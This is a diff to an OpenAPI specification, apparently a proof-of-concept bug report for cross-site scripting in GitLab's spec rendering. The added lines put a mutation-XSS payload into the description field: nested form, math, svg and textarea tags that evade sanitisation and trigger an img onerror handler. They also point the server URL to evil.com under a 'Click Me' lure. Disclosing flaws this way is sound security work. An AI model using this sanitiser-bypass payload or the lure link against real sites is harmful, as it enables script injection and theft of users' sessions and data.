@@ -2,7 +2,7 @@
     "openapi": "3.0.0",
     "info": {
         "title": "OpenAPI Bug Test",
-        "description": "OpenAPI specification Test in GitLab",
+        "description": "<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>",
         "contact": {
             "name": "Test",
             "url": "http://www.test.com/",
@@ -15,8 +15,8 @@
     },
     "servers": [
         {
-        "url": "https://test.domain.tld",
-        "description": "Test Server"
+        "url": "https://evil.com",
+        "description": "Click Me"
         }
     ],
     "paths": {
